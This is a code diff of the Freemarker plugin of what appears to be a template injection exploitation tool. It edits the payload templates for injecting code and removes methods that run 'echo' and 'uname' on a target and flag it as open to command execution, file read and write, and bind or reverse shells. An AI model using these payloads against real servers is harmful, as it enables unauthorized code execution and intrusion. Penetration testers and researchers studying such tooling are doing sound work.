@@ -1,20 +1,20 @@
 from utils.strings import quote, chunkit, md5
 from utils.loggers import log
 from utils import rand
-from core.plugin import Plugin
+from plugins.languages import java
 from core import languages
 import re
 
-class Freemarker(Plugin):
+class Freemarker(java.Java):
     
     def init(self):
 
         self.update_actions({
             'render' : {
-                'render': '${%(code)s}',
+                'render': '%(code)s',
                 'header': '${%(header)s?c}',
                 'trailer': '${%(trailer)s?c}',
-                'render_test': """%(r1)s}<#--%(comment)s-->${%(r2)s""" % { 
+                'render_test': """${%(r1)s}<#--%(comment)s-->${%(r2)s}""" % { 
                     'r1' : rand.randints[0],
                     'comment' : rand.randints[1],
                     'r2' : rand.randints[2]
@@ -79,30 +79,3 @@ class Freemarker(Plugin):
             { 'level': 5, 'prefix': '%(closure)s as a></#list><#list [1] as a>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
         ])
 
-
-    language = 'java'
-
-    def rendered_detected(self):
-
-        expected_rand = str(rand.randint_n(2))
-        if expected_rand == self.execute('echo %s' % expected_rand):
-            self.set('execute', True)
-            self.set('write', True)
-            self.set('read', True)
-            self.set('bind_shell', True)
-            self.set('reverse_shell', True)
-
-            os = self.execute("""uname""")
-            if os and re.search('^[\w-]+$', os):
-                self.set('os', os)
-
-    def blind_detected(self):
-
-        # No blind code evaluation is possible here, only execution
-
-        # Since execution has been used to detect blind injection,
-        # let's assume execute_blind as set.
-        self.set('execute_blind', True)
-        self.set('write', True)
-        self.set('bind_shell', True)
-        self.set('reverse_shell', True)
